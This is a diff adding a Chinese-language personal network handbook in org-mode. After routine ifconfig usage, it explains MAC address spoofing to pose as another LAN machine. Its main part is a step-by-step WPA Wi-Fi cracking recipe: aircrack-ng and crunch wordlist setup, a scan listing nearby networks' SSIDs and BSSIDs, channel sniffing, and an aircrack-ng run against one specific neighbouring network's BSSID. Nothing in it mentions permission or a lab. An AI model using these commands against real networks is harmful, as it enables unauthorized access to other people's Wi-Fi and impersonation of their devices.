@@ -1,0 +1,158 @@
+#+TITLE: Network Handbook
+
++ 当前基础信息：
+#+BEGIN_QUOTE
+$ ifconfig
+lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384
+	options=3<RXCSUM,TXCSUM>
+	inet6 ::1 prefixlen 128 
+	inet 127.0.0.1 netmask 0xff000000 
+	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
+	nd6 options=1<PERFORMNUD>
+gif0: flags=8010<POINTOPOINT,MULTICAST> mtu 1280
+stf0: flags=0<> mtu 1280
+en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+	ether a4:5e:60:c0:ee:9b 
+	inet6 fe80::a65e:60ff:fec0:ee9b%en0 prefixlen 64 scopeid 0x4 
+	inet 192.168.0.111 netmask 0xffffff00 broadcast 192.168.0.255
+	nd6 options=1<PERFORMNUD>
+	media: autoselect
+	status: active
+en1: flags=963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX> mtu 1500
+	options=60<TSO4,TSO6>
+	ether 4a:00:00:b8:f1:e0 
+	media: autoselect <full-duplex>
+	status: inactive
+en2: flags=963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX> mtu 1500
+	options=60<TSO4,TSO6>
+	ether 4a:00:00:b8:f1:e1 
+	media: autoselect <full-duplex>
+	status: inactive
+p2p0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 2304
+	ether 06:5e:60:c0:ee:9b 
+	media: autoselect
+	status: inactive
+awdl0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1484
+	ether 86:45:47:7e:19:3b 
+	inet6 fe80::8445:47ff:fe7e:193b%awdl0 prefixlen 64 scopeid 0x8 
+	nd6 options=1<PERFORMNUD>
+	media: autoselect
+	status: active
+bridge0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+	options=63<RXCSUM,TXCSUM,TSO4,TSO6>
+	ether a6:5e:60:0c:75:00 
+	Configuration:
+		id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
+		maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
+		root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
+		ipfilter disabled flags 0x2
+	member: en1 flags=3<LEARNING,DISCOVER>
+	        ifmaxaddr 0 port 5 priority 0 path cost 0
+	member: en2 flags=3<LEARNING,DISCOVER>
+	        ifmaxaddr 0 port 6 priority 0 path cost 0
+	nd6 options=1<PERFORMNUD>
+	media: <unknown type>
+	status: inactive
+#+END_QUOTE
+
+* 网络操作命令
+
+** ifconfig常用命令
+ + 只列出处于激活状态的网络接口
+ $ ifconfig 
+
+ + 列出所有网络接口，不论是否激活
+ $ ifconfig -a
+
+ + 查看具体网卡信息
+ $ ifconfig en0
+
+ + 网卡的关闭与激活
+ $ sudo ifconfig en0 down
+ $ sudo ifconfig en0 up
+
+ + 为网卡设置IP地址
+ $ sudo ifconfig en0 192.168.0.111 netmask 255.255.255.0
+
+ + 为网卡设置第二个IP地址
+ $ sudo ifconfig en0 192.168.0.222 netmask 255.255.255.0 alias
+
+ + 删除网卡的IP地址
+ $ sudo ifconfig en0 delete 192.168.0.222
+
+ + 更改Mac地址
+ $ sudo ifconfig en0 ether xx:xx:xx:xx:xx:xx
+ 注意：Mac地址的第一位必须为偶数(以0,2,4,6,8,A,C,E结尾)
+
+ + 通过ifconfig所做更改在重启之后会失效。
+
+** 伪装成另一台机器上网
+ + 地址解析，列出局域网其他设备和mac地址
+ $ arp -a
+
+ + 更改自己的网卡Mac地址
+ $ sudo ifconfig en0 ether xx:xx:xx:xx:xx:xx
+
+ + 查看效果
+ $ ifconfig en0 | grep ether
+
+ torproject.org
+
+
+* Wi-Fi破解
+** 工具准备
+  + 安装aircrack-ng
+  $ brew install aircrack-ng
+  $ sudo ln -s /usr/local/cellar/aircrack-ng/1.1_2/bin/aircrack-ng /usr/local/bin/aircrack-ng
+
+  + 创建airport的链接
+  $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
+
+  + crunch
+  $ brew install crunch
+  $ sudo ln -s /usr/local/cellar/crunch/3.6/bin/crunch /usr/local/bin/crunch
+  $ crunch 6 6 0123456789abcdef -o 6chars.txt
+    crunch [min length] [max length] [character set] [options]
+  使用给定的字符（0123456789abcdef）创建字典文件。其中的word最小长度为6，最大长度为6。完成后将字典文件输出为6chars.txt，保存在~目录下。
+
+** 开始破解
+  + 查找可用Wi-Fi
+  $sudo airport -s
+ #+BEGIN_QUOTE
+                             SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
+                    ChinaNet-op4A 02:0e:5e:2b:8c:85 -85  1       Y  AL WPA2(PSK/TKIP,AES/TKIP) 
+                     TP-LINK_9F77 88:25:93:37:9f:77 -91  11,-1   Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                     TP-LINK_FECA 8c:a6:df:1e:fe:ca -83  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                      biglass3_5G 30:fc:68:bb:78:eb -62  157     Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                       Biglss2_5G 04:02:1f:53:5c:44 -80  149     Y  US WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                     TP-LINK_C48C e4:d3:32:4f:c4:8c -78  6,-1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                       TP-LINK_b3 80:89:17:7b:3a:5a -90  6,-1    Y  CN WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 
+                          Biglss2 04:02:1f:53:5c:40 -61  6,-1    Y  US WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                        rangzhang e0:05:c5:e8:b7:0a -64  4,+1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                     Tenda_136D20 c8:3a:35:13:6d:20 -78  4,+1    Y  -- WPA(PSK/AES/AES) 
+                          Biglass 08:57:00:72:84:e0 -70  2,+1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+  HP-Print-20-Deskjet 4640 series fc:15:b4:6a:50:20 -80  1       N  -- WPA2(PSK/AES/AES) 
+                               HB e4:d3:32:28:b5:9a -53  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                          InteAir 50:bd:5f:36:3d:44 -56  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                    ChinaNet-KAbz 02:0e:5e:2e:8f:46 -71  1       Y  AL WPA2(PSK/TKIP,AES/TKIP) 
+                   biglass3_Guest 3a:fc:68:bb:78:e9 -56  11      Y  -- NONE
+                         biglass3 30:fc:68:bb:78:e9 -56  11      Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
+                        D-Link_zm 78:54:2e:a9:0d:a8 -48  8,-1    Y  -- WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) 
+ #+END_QUOTE
+
+  + 开始监听
+  $ sudo airport en0 sniff 8（channel）
+  此时本机Wi-Fi会进入monitor状态。监听的文件会放在/tmp文件夹下面。
+
+  + 开始破解
+  # $ sudo aircrack-ng -l -a 2 -b 78:54:2e:a9:0d:a8 监听文件
+  $ sudo aircrack-ng -w wordlist.lst（字典） -b 78:54:2e:a9:0d:a8（BSSID） /private/tmp/*.cap（监听到的文件）
+  如果没有成功继续执行上条命令。
+
+
+
+
+
+
+
+
